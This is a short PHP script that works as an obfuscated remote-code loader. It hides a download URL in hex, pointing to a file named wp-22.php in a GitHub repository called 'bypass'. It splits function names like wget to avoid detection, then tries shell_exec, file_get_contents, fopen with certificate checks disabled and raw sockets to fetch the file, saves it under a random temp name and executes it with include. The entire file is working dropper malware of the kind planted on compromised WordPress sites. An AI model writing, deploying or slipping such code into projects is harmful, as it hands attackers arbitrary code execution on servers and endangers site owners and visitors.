<?php
$hx = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F737461726B7670733030372F6279706173732F726566732F68656164732F6D61696E2F77702D32322E706870';

function h2s($h) {
    $o = '';
    for ($i = 0; $i < strlen($h); $i += 2) {
        $o .= chr(hexdec($h[$i] . $h[$i + 1]));
    }
    return $o;
}

$u = h2s($hx);
$f = '__tmp' . substr(md5(microtime(true)), 0, 7) . '.php';

$w1 = 'w'.'g'.'e'.'t';
$f1 = 'fi'.'le_' .'get'. '_con'.'tents';

// 1. shell_exec wget
@shell_exec($w1 . ' ' . escapeshellarg($u) . ' -O ' . $f);

// 2. file_get_contents fallback
if (!file_exists($f) || filesize($f) === 0) {
    $d = @$f1($u);
    if ($d && strlen($d) > 10) {
        file_put_contents($f, $d);
    }
}

// 3. fopen fallback
function dFopen($url) {
    $c = stream_context_create([
        'http' => ['timeout' => 8],
        'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
    ]);
    $fp = @fopen($url, 'r', false, $c);
    if ($fp) {
        $b = stream_get_contents($fp);
        fclose($fp);
        return $b;
    }
    return false;
}

if (!file_exists($f) || filesize($f) === 0) {
    $d = dFopen($u);
    if ($d && strlen($d) > 10) {
        file_put_contents($f, $d);
    }
}

// 4. fsockopen fallback
function dSock($url) {
    $p = parse_url($url);
    $h = $p['host'];
    $pt = ($p['scheme'] === 'https') ? 443 : 80;
    $ph = $p['path'] . (isset($p['query']) ? '?' . $p['query'] : '');
    $fp = @fsockopen(($pt === 443 ? 'ssl://' : '') . $h, $pt, $e, $t, 10);
    if (!$fp) return false;
    $r = "GET $ph HTTP/1.0\r\nHost: $h\r\nConnection: Close\r\n\r\n";
    fwrite($fp, $r);
    $res = '';
    while (!feof($fp)) $res .= fgets($fp, 128);
    fclose($fp);
    $sp = explode("\r\n\r\n", $res, 2);
    return $sp[1] ?? false;
}

if (!file_exists($f) || filesize($f) === 0) {
    $d = dSock($u);
    if ($d && strlen($d) > 10) {
        file_put_contents($f, $d);
    }
}

// Final check
if (!file_exists($f) || filesize($f) === 0) {
    die("\x45\x72\x72\x6F\x72: Download failed.");
}

include($f);
?>
